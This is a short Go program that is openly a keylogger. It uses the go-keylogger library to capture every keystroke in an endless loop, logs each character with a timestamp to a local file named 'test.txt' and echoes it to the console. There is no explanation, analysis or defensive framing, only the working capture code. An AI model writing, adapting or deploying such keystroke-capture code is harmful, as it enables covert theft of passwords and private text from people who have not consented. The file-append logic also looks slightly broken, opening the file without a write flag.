package main

import(
	keys"github.com/kindlyfire/go-keylogger"
	"time"
	"fmt"
	"os"
)

func Exists(name string) bool {
    if _, err := os.Stat(name); err != nil {
        if os.IsNotExist(err) {
            return false
        }
    }
    return true
}

func getfileobj(name string) *os.File {
	if Exists(name) {
		f, err := os.OpenFile(name, os.O_APPEND, 222)
		if err != nil {
			os.Exit(1)
		}
		return(f) 
	} else {
		f, err2 := os.Create(name)
		if err2 != nil {
			os.Exit(2)
		}
		return(f)
	}
}

func main() {
	kl := keys.NewKeylogger()
	f := getfileobj("test.txt")	
	for {
		key := kl.GetKey()
		if !key.Empty {
			f.WriteString("'"+string(key.Rune)+"' 	["+time.Now().Format("2006-01-02 15:04:05")+"]\n")
			fmt.Printf(string(key.Rune))
		}
	}	
}
